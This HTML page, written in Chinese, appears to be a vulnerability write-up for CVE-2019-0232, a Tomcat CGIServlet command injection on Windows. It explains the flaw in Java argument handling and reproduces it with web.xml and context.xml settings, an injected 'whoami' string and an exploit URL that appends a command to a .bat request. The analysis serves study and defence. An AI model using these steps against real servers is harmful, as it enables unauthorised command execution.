<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X97beada541665de89504a2f762cbe833127851a"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-0232</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Tomcat rce</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞是由于</span><span class="cs8926E06">Tomcat CGI</span><span class="cs9C1B1871">将命令行参数传递给</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">程序的方式存在错误，使得</span><span class="cs8926E06">CGIServlet</span><span class="cs9C1B1871">被命令注入影响。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞只影响</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">平台，要求启用了</span><span class="cs8926E06">CGIServlet</span><span class="cs9C1B1871">和</span><span class="cs8926E06">enableCmdLineArguments</span><span class="cs9C1B1871">参数。但是</span><span class="cs8926E06">CGIServlet</span><span class="cs9C1B1871">和</span><span class="cs8926E06">enableCmdLineArguments</span><span class="cs9C1B1871">参数默认情况下都不启用。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Tomcat 9.0.0.M1 to 9.0.17</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Apache Tomcat 8.5.0 to 8.5.39</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Apache Tomcat 7.0.0 to 7.0.93</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞相关的代码在</span><span class="cs8926E06"> </span><span class="cs9FB05234">tomcat\java\org\apache\catalina\servlets\CGIServlet.java</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中，</span><span class="cs8926E06">CGIServlet</span><span class="cs9C1B1871">提供了一个</span><span class="cs8926E06">cgi</span><span class="cs9C1B1871">的调用接口，在启用</span><span class="cs8926E06"> </span><span class="cs9FB05234">enableCmdLineArguments</span><span class="cs8926E06"> </span><span class="cs9C1B1871">参数时，会根据</span><span class="cs8926E06">RFC 3875</span><span class="cs9C1B1871">来从</span><span class="cs8926E06">Url</span><span class="cs9C1B1871">参数中生成命令行参数，并把参数传递至</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">Runtime</span><span class="cs8926E06"> </span><span class="cs9C1B1871">执行。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这个漏洞是因为</span><span class="cs8926E06"> </span><span class="cs9FB05234">Runtime.getRuntime().exec</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">中和</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">中底层实现不同导致的。下面以一个简单的</span><span class="cs8926E06">case</span><span class="cs9C1B1871">来说明这个问题，在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">下创建</span><span class="cs8926E06">arg.bat</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">rem arg.bat</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo %*</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">并执行如下的</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">代码</span></p><p class="cs3A447A38"><span class="cs9FB05234">String [] cmd={&quot;arg.bat&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Runtime.getRuntime().exec(cmd);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">下会输出</span><span class="cs8926E06"> </span><span class="cs9FB05234">arg</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs9FB05234">dir</span><span class="cs8926E06"> </span><span class="cs9C1B1871">命令运行后的结果。同样的，用类似的脚本在</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">环境下测试：</span></p><p class="cs3A447A38"><span class="cs9FB05234"># arg.sh</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for key in &quot;$@&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">do</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &#39;$@&#39; $key</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">done</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">String [] cmd={&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Runtime.getRuntime().exec(cmd);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此时的输出为</span></p><p class="cs3A447A38"><span class="cs9FB05234">$@ arg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$@ &amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$@ dir</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">导致这种输出的原因是在</span><span class="cs8926E06">JDK</span><span class="cs9C1B1871">的实现中</span><span class="cs8926E06"> </span><span class="cs9FB05234">Runtime.getRuntime().exec</span><span class="cs8926E06"> </span><span class="cs9C1B1871">实际调用了</span><span class="cs8926E06"> </span><span class="cs9FB05234">ProcessBuilder</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，而后</span><span class="cs8926E06"> </span><span class="cs9FB05234">ProcessBuilder</span><span class="cs8926E06"> </span><span class="cs9C1B1871">调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">ProcessImpl</span><span class="cs9C1B1871">使用系统调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">vfork</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，把所有参数直接传递至</span><span class="cs8926E06"> </span><span class="cs9FB05234">execve</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">用</span><span class="cs8926E06"> </span><span class="cs9FB05234">strace -F -e vfork,execve java Main</span><span class="cs8926E06"> </span><span class="cs9C1B1871">跟踪可以看到上面的</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">代码在</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">中调用为</span></p><p class="cs3A447A38"><span class="cs9FB05234">execve(&quot;arg.sh&quot;, [&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */])</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而如果跟踪类似的</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码</span><span class="cs8926E06"> </span><span class="cs9FB05234">system(&#39;a.sh arg &amp; dir&#39;);</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，得到的结果为</span></p><p class="cs3A447A38"><span class="cs9FB05234">execve(&quot;/bin/sh&quot;, &nbsp;[&quot;sh&quot;, &quot;-c&quot;, &quot;a.sh arg &amp; dir&quot;], [/* 23 vars */])</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">Runtime.getRuntime().exec</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">CGI</span><span class="cs9C1B1871">调用这种情况下很难有命令注入。而</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">中创建进程使用的是</span><span class="cs8926E06"> </span><span class="cs9FB05234">CreateProcess</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，会将参数合并成字符串，作为</span><span class="cs8926E06"> </span><span class="cs9FB05234">lpComandLine</span><span class="cs8926E06"> </span><span class="cs9C1B1871">传入</span><span class="cs8926E06"> </span><span class="cs9FB05234">CreateProcess</span><span class="cs8926E06"> </span><span class="cs9C1B1871">。程序启动后调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">GetCommandLine</span><span class="cs8926E06"> </span><span class="cs9C1B1871">获取参数，并调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">CommandLineToArgvW</span><span class="cs8926E06"> </span><span class="cs9C1B1871">传至</span><span class="cs8926E06"> argv</span><span class="cs9C1B1871">。在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">中，当</span><span class="cs8926E06"> </span><span class="cs9FB05234">CreateProcess</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中的参数为</span><span class="cs8926E06"> bat </span><span class="cs9C1B1871">文件或是</span><span class="cs8926E06"> cmd </span><span class="cs9C1B1871">文件时，会调用</span><span class="cs8926E06"> </span><span class="cs9FB05234">cmd.exe</span><span class="cs8926E06"> , </span><span class="cs9C1B1871">故最后会变成</span><span class="cs8926E06"> </span><span class="cs9FB05234">cmd.exe /c &quot;arg.bat &amp; dir&quot;</span><span class="cs9C1B1871">，而</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">的调用过程并没有做任何的转义，所以在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">下会存在漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">除此之外，</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">例如</span><span class="cs8926E06"> </span><span class="cs9FB05234">dir &quot;\&quot;&amp;whoami&quot;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">中是安全的，而在</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">会执行命令。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这是因为</span><span class="cs8926E06">Windows</span><span class="cs9C1B1871">在处理命令行参数时，会将</span><span class="cs8926E06"> </span><span class="cs9FB05234">&quot;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个</span><span class="cs8926E06"> </span><span class="cs9FB05234">&quot;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，但是对</span><span class="cs8926E06"> </span><span class="cs9FB05234">\&quot;</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的处理有误。同样用</span><span class="cs8926E06"> </span><span class="cs9FB05234">arg.bat</span><span class="cs8926E06"> </span><span class="cs9C1B1871">做测试，可以发现这里只输出了</span><span class="cs8926E06"> </span><span class="cs9FB05234">\</span><span class="cs8926E06"> </span><span class="cs9C1B1871">。因此在</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">中调用批处理或者</span><span class="cs8926E06">cmd</span><span class="cs9C1B1871">文件时，需要做合适的参数检查才能避免漏洞出现。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">笔者使用的复现环境为</span><span class="cs8926E06">9.0.12 + JRE 1.8.0</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先进行</span><span class="cs8926E06">CGI</span><span class="cs9C1B1871">相关的配置，在</span><span class="cs8926E06"> </span><span class="cs9FB05234">conf/web.xml</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中启用</span><span class="cs8926E06">CGIServlet</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;servlet&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-name&gt;cgi&lt;/servlet-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;true&lt;/param-value&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-name&gt;executable&lt;/param-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;param-value&gt;&lt;/param-value&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/init-param&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;load-on-startup&gt;5&lt;/load-on-startup&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/servlet&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里主要的设置是</span><span class="cs8926E06"> </span><span class="cs9FB05234">enableCmdLineArguments</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs9FB05234">executable</span><span class="cs8926E06"> </span><span class="cs9C1B1871">两个选项。</span><span class="cs8926E06"> </span><span class="cs9FB05234">enableCmdLineArguments</span><span class="cs8926E06"> </span><span class="cs9C1B1871">启用后才会将</span><span class="cs8926E06">Url</span><span class="cs9C1B1871">中的参数传递到命令行，</span><span class="cs8926E06"> </span><span class="cs9FB05234">executable</span><span class="cs8926E06"> </span><span class="cs9C1B1871">指定了执行的二进制文件，默认是</span><span class="cs8926E06"> </span><span class="cs9FB05234">perl</span><span class="cs9C1B1871">，需要置为空才会执行文件本身。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同样在</span><span class="cs8926E06"> </span><span class="cs9FB05234">conf/web.xml</span><span class="cs8926E06"> </span><span class="cs9C1B1871">中启用</span><span class="cs8926E06">cgi</span><span class="cs9C1B1871">的</span><span class="cs8926E06">servlet-mapping</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;servlet-mapping&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;servlet-name&gt;cgi&lt;/servlet-name&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/servlet-mapping&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后修改</span><span class="cs8926E06"> </span><span class="cs9FB05234">conf/context.xml</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">` </span><span class="cs7FFD2630">添加</span><span class="cs8926E06">privileged=&quot;true&quot;`</span><span class="cs9C1B1871">属性，否则会没有权限</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;Context privileged=&quot;true&quot;&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!-- Default set of monitored resources. If one of these changes, the &nbsp;&nbsp;&nbsp;--&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!-- web application will be reloaded. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;!--</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Manager pathname=&quot;&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;--&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/Context&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后在</span><span class="cs8926E06"> </span><span class="cs9FB05234">ROOT\WEB-INF</span><span class="cs8926E06"> </span><span class="cs9C1B1871">下创建</span><span class="cs8926E06"> </span><span class="cs9FB05234">cgi-bin</span><span class="cs8926E06"> </span><span class="cs9C1B1871">目录</span><span class="cs8926E06">, </span><span class="cs9C1B1871">并在该目录下创建一个内容为</span><span class="cs8926E06"> </span><span class="cs9FB05234">echo Content-type: text/html</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">e.bat</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">配置完成后，启动</span><span class="cs8926E06">tomcat</span><span class="cs9C1B1871">，访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">http://0-sec.org:8080/cgi-bin/e.bat?&amp;ver</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，可以看到命令执行成功。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/4875"><span class="cs4B51D5E4">https://xz.aliyun.com/t/4875</span></a></span></p></body>
</html>
